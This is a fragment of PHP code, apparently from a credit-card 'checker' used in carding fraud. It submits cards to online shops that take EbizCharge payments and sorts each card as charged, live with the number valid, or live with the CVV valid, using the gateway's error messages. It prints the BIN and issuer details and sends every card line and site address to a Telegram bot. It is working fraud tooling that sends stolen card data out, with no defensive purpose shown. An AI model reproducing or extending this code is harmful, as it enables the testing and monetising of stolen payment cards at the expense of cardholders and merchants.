...
$paymentMethods = [
    ...
    'ebizcharge' => '/<input[^>]*name="payment_method"[^>]*value="ebizcharge"/'
];
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED EBIZCHARGED]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

} elseif (strpos($msg, '(Transaction Error) Invalid CVV value') !== false || strpos($msg, 'Declined by Processor or Issuer - CVV2 Value supplied is invalid.') !== false) {

            echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [INVALID CVV VALUE][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #daff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


      $telegramMessage = "[#CCN]- $lista [CCN LIVE EBIZCHARGED]

    \n[$hostname1]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

    } elseif (strpos($msg, '(Transaction Error) Your billing address does not match your credit card. Please check with your bank.') !== false || strpos($msg, 'Declined by Processor or Issuer - CVV2 Value supplied is invalid.') !== false) {

            echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [Gateway Reject Avs][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #daff09ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';


      $telegramMessage = "[#CVV]- $lista [CVV LIVE EBIZCHARGED]
